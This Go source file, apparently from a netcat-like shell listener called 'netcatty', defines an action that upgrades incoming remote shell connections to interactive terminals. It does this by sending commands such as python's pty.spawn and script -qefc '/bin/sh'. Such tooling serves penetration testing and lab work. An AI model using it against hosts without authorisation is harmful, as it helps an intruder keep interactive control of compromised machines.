package action

import (
	"io"

	"github.com/dzervas/netcatty/service"
)

var shellInit = map[string][]string{
	"python": { "import pty; pty.spawn('python')" },
	"sh": {
		"script -qefc '/bin/sh' /dev/null",
		"TERM=xterm",
	},
}

type RaiseTTY struct {
	*Action
}

func NewRaiseTTY(ser service.Server) *RaiseTTY {
	action := &Action{
		service: ser,
		events: []service.Event{service.EConnect},
	}
	return &RaiseTTY{action}
}

// TODO: Make proper dependency registration
func (this *RaiseTTY) Register() {
	this.Action.Register()
	go this.handleConnections()
}

func (this *RaiseTTY) handleConnections() {
	loop: for {
		switch e := <-this.channel; e.Event {
		case service.EConnect:
			this.Block()
			detect(e.ReadWriteCloser)
			raise(e.ReadWriteCloser)
			this.Unblock()
		case service.EUnregister:
			break loop
		}
	}
}

func raise(conn io.ReadWriter) {
	if len(State["shell"]) == 0 {
		Log.Errorln("Current shell is not defined")
		return
	}

	if len(shellInit[State["shell"]]) == 0 {
		Log.Errorf("Current shell %s has no known payloads", State["shell"])
		return
	}

	for _, cmd := range shellInit[State["shell"]] {
		conn.Write([]byte(cmd + "\n"))
	}
}
